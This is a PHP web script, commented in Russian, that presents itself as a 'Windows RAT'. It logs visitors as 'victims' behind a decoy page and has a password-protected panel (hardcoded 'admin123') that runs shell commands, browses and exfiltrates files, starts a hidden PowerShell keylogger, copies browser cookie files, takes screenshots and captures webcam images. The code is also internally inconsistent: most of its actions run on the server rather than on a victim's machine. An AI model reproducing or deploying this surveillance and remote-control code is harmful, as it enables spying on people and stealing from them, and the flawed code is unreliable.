<?php
session_start();
header('Content-Type: application/json');

// Конфигурация
$config = [
    'log_dir' => 'logs/',
    'upload_dir' => 'uploads/',
    'admin_password' => 'admin123', // для доступа к панели
    'telegram_bot' => 'YOUR_BOT_TOKEN', // опционально
    'telegram_chat' => 'YOUR_CHAT_ID'   // опционально
];

// Создаем директории
foreach(['log_dir', 'upload_dir'] as $dir) {
    if (!file_exists($config[$dir])) {
        mkdir($config[$dir], 0777, true);
    }
}

// Основная логика RAT
class WindowsRAT {
    private $config;
    private $victim_id;
    
    function __construct($config) {
        $this->config = $config;
        $this->victim_id = $this->getVictimId();
        $this->logVisit();
    }
    
    private function getVictimId() {
        $ip = $_SERVER['REMOTE_ADDR'];
        $agent = $_SERVER['HTTP_USER_AGENT'];
        return md5($ip . $agent);
    }
    
    private function logVisit() {
        $data = [
            'victim_id' => $this->victim_id,
            'ip' => $_SERVER['REMOTE_ADDR'],
            'user_agent' => $_SERVER['HTTP_USER_AGENT'],
            'referer' => $_SERVER['HTTP_REFERER'] ?? 'direct',
            'time' => date('Y-m-d H:i:s'),
            'os' => $this->getOS(),
            'browser' => $this->getBrowser()
        ];
        
        file_put_contents(
            $this->config['log_dir'] . 'visits.log',
            json_encode($data) . PHP_EOL,
            FILE_APPEND
        );
    }
    
    private function getOS() {
        $ua = $_SERVER['HTTP_USER_AGENT'];
        $os_list = [
            'Windows 10' => 'Windows NT 10',
            'Windows 8.1' => 'Windows NT 6.3',
            'Windows 8' => 'Windows NT 6.2',
            'Windows 7' => 'Windows NT 6.1',
            'Windows Vista' => 'Windows NT 6.0',
            'Windows XP' => 'Windows NT 5',
            'Mac OS X' => 'Mac OS X',
            'Linux' => 'Linux'
        ];
        
        foreach($os_list as $os => $pattern) {
            if(strpos($ua, $pattern) !== false) return $os;
        }
        return 'Unknown';
    }
    
    private function getBrowser() {
        $ua = $_SERVER['HTTP_USER_AGENT'];
        $browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera', 'MSIE'];
        
        foreach($browsers as $browser) {
            if(strpos($ua, $browser) !== false) return $browser;
        }
        return 'Unknown';
    }
    
    public function executeCommand($command, $params = []) {
        switch($command) {
            case 'get_system_info':
                return $this->getSystemInfo();
                
            case 'get_files':
                return $this->listFiles($params['path'] ?? 'C:\\');
                
            case 'download_file':
                return $this->downloadFile($params['file']);
                
            case 'upload_file':
                return $this->uploadFile($_FILES['file'] ?? null);
                
            case 'execute_command':
                return $this->execSystemCommand($params['cmd']);
                
            case 'screenshot':
                return $this->takeScreenshot();
                
            case 'keylogger':
                return $this->keyloggerStart();
                
            case 'steal_cookies':
                return $this->stealBrowserData();
                
            case 'webcam':
                return $this->accessWebcam();
                
            default:
                return ['error' => 'Unknown command'];
        }
    }
    
    private function getSystemInfo() {
        $info = [
            'victim_id' => $this->victim_id,
            'ip' => $_SERVER['REMOTE_ADDR'],
            'hostname' => gethostbyaddr($_SERVER['REMOTE_ADDR']),
            'os' => php_uname(),
            'browser' => $_SERVER['HTTP_USER_AGENT'],
            'language' => $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'unknown',
            'time' => date('Y-m-d H:i:s')
        ];
        
        // Пытаемся получить больше информации через JS
        $info['js_info'] = $_POST['js_data'] ?? 'not collected';
        
        return $info;
    }
    
    private function listFiles($path) {
        $files = [];
        if(is_dir($path)) {
            $scan = scandir($path);
            foreach($scan as $item) {
                if($item != '.' && $item != '..') {
                    $full = $path . DIRECTORY_SEPARATOR . $item;
                    $files[] = [
                        'name' => $item,
                        'path' => $full,
                        'size' => is_file($full) ? filesize($full) : 0,
                        'type' => is_dir($full) ? 'dir' : 'file',
                        'modified' => date('Y-m-d H:i:s', filemtime($full))
                    ];
                }
            }
        }
        return $files;
    }
    
    private function downloadFile($file) {
        if(file_exists($file)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($file) . '"');
            readfile($file);
            exit;
        }
        return ['error' => 'File not found'];
    }
    
    private function uploadFile($file) {
        if($file && $file['error'] == 0) {
            $dest = $this->config['upload_dir'] . $file['name'];
            if(move_uploaded_file($file['tmp_name'], $dest)) {
                return ['success' => true, 'path' => $dest];
            }
        }
        return ['error' => 'Upload failed'];
    }
    
    private function execSystemCommand($cmd) {
        if(strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            $output = shell_exec($cmd . ' 2>&1');
        } else {
            $output = shell_exec($cmd . ' 2>&1');
        }
        return ['command' => $cmd, 'output' => $output];
    }
    
    private function takeScreenshot() {
        // Для Windows можно попробовать использовать PowerShell
        $ps_script = '
            Add-Type -AssemblyName System.Windows.Forms
            Add-Type -AssemblyName System.Drawing
            $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
            $image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)
            $graphic = [System.Drawing.Graphics]::FromImage($image)
            $graphic.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size)
            $image.Save("screenshot.jpg")
        ';
        
        file_put_contents('screenshot.ps1', $ps_script);
        shell_exec('powershell -ExecutionPolicy Bypass -File screenshot.ps1');
        
        if(file_exists('screenshot.jpg')) {
            return base64_encode(file_get_contents('screenshot.jpg'));
        }
        return ['error' => 'Screenshot failed'];
    }
    
    private function keyloggerStart() {
        $ps_keylogger = '
            $log = "keylog.txt"
            while($true) {
                $key = [System.Console]::ReadKey($true)
                $keyChar = $key.KeyChar
                if($keyChar) {
                    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
                    "$timestamp - $keyChar" | Out-File $log -Append
                }
                Start-Sleep -Milliseconds 10
            }
        ';
        
        file_put_contents('keylogger.ps1', $ps_keylogger);
        shell_exec('powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File keylogger.ps1');
        
        return ['success' => 'Keylogger started'];
    }
    
    private function stealBrowserData() {
        $browsers = ['Chrome', 'Firefox', 'Edge'];
        $cookies = [];
        
        foreach($browsers as $browser) {
            $paths = [
                'Chrome' => getenv('LOCALAPPDATA') . '\Google\Chrome\User Data\Default\Cookies',
                'Firefox' => getenv('APPDATA') . '\Mozilla\Firefox\Profiles\*.default\cookies.sqlite',
                'Edge' => getenv('LOCALAPPDATA') . '\Microsoft\Edge\User Data\Default\Cookies'
            ];
            
            if(isset($paths[$browser]) && file_exists($paths[$browser])) {
                $cookies[$browser] = base64_encode(file_get_contents($paths[$browser]));
            }
        }
        
        return $cookies;
    }
    
    private function accessWebcam() {
        $js_webcam = '
            <script>
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(function(stream) {
                    const video = document.createElement("video");
                    video.srcObject = stream;
                    video.play();
                    
                    setTimeout(function() {
                        const canvas = document.createElement("canvas");
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext("2d").drawImage(video, 0, 0);
                        
                        fetch("rat.php?action=webcam_capture", {
                            method: "POST",
                            body: JSON.stringify({ image: canvas.toDataURL() })
                        });
                        
                        stream.getTracks().forEach(track => track.stop());
                    }, 2000);
                })
                .catch(function(err) {
                    console.log("Camera access denied");
                });
            </script>
        ';
        
        return ['html' => $js_webcam];
    }
}

// Обработка запросов
$rat = new WindowsRAT($config);
$action = $_GET['action'] ?? $_POST['action'] ?? '';

switch($action) {
    case 'init':
        // Просто логируем визит
        echo json_encode(['status' => 'connected']);
        break;
        
    case 'command':
        // Выполнение команд (только для админа)
        if($_POST['password'] === $config['admin_password']) {
            $result = $rat->executeCommand(
                $_POST['cmd'],
                json_decode($_POST['params'] ?? '{}', true)
            );
            echo json_encode($result);
        } else {
            echo json_encode(['error' => 'Unauthorized']);
        }
        break;
        
    case 'admin_panel':
        // Админ панель для просмотра жертв
        if($_GET['pass'] === $config['admin_password']) {
            ?>
            <!DOCTYPE html>
            <html>
            <head>
                <title>RAT Panel</title>
                <style>
                    * { margin: 0; padding: 0; box-sizing: border-box; }
                    body { background: #1a1a1a; color: #00ff00; font-family: monospace; padding: 20px; }
                    .container { max-width: 1200px; margin: 0 auto; }
                    .header { border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 20px; }
                    .victim { background: #2a2a2a; padding: 15px; margin-bottom: 10px; border-radius: 5px; }
                    .victim:hover { background: #333; }
                    .ip { color: #00ff00; font-weight: bold; }
                    .time { color: #888; font-size: 12px; }
                    .commands { margin-top: 10px; }
                    button { background: #00ff00; color: #000; border: none; padding: 5px 10px; margin-right: 5px; cursor: pointer; }
                    button:hover { background: #00cc00; }
                    .log { background: #000; padding: 10px; margin-top: 10px; max-height: 300px; overflow-y: auto; }
                </style>
            </head>
            <body>
                <div class="container">
                    <div class="header">
                        <h1>RAT Control Panel</h1>
                        <p>Active Victims: <?php echo count(file($config['log_dir'] . 'visits.log')) ?? 0; ?></p>
                    </div>
                    
                    <div class="victims">
                        <?php
                        if(file_exists($config['log_dir'] . 'visits.log')) {
                            $lines = file($config['log_dir'] . 'visits.log');
                            foreach(array_reverse($lines) as $line) {
                                $data = json_decode($line, true);
                                ?>
                                <div class="victim">
                                    <div>
                                        <span class="ip"><?php echo $data['ip']; ?></span> - 
                                        <span class="time"><?php echo $data['time']; ?></span>
                                    </div>
                                    <div>OS: <?php echo $data['os']; ?></div>
                                    <div>Browser: <?php echo $data['browser']; ?></div>
                                    <div>ID: <?php echo $data['victim_id']; ?></div>
                                    <div class="commands">
                                        <button onclick="sendCommand('<?php echo $data['victim_id']; ?>', 'get_system_info')">System Info</button>
                                        <button onclick="sendCommand('<?php echo $data['victim_id']; ?>', 'get_files')">Files</button>
                                        <button onclick="sendCommand('<?php echo $data['victim_id']; ?>', 'screenshot')">Screenshot</button>
                                        <button onclick="sendCommand('<?php echo $data['victim_id']; ?>', 'steal_cookies')">Cookies</button>
                                        <button onclick="sendCommand('<?php echo $data['victim_id']; ?>', 'webcam')">Webcam</button>
                                    </div>
                                    <div class="log" id="log-<?php echo $data['victim_id']; ?>"></div>
                                </div>
                                <?php
                            }
                        }
                        ?>
                    </div>
                </div>
                
                <script>
                function sendCommand(victimId, cmd) {
                    fetch('rat.php?action=command', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            password: 'admin123',
                            cmd: cmd,
                            victim_id: victimId
                        })
                    })
                    .then(response => response.json())
                    .then(data => {
                        document.getElementById('log-' + victimId).innerHTML = 
                            '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
                    });
                }
                </script>
            </body>
            </html>
            <?php
        }
        break;
        
    case 'webcam_capture':
        $data = json_decode(file_get_contents('php://input'), true);
        if(isset($data['image'])) {
            $image = str_replace('data:image/png;base64,', '', $data['image']);
            $image = str_replace(' ', '+', $image);
            $image_data = base64_decode($image);
            
            $filename = 'uploads/webcam_' . date('Ymd_His') . '.png';
            file_put_contents($filename, $image_data);
            
            echo json_encode(['success' => true, 'file' => $filename]);
        }
        break;
        
    default:
        // Показываем страницу-приманку
        readfile('index.html');
}
?>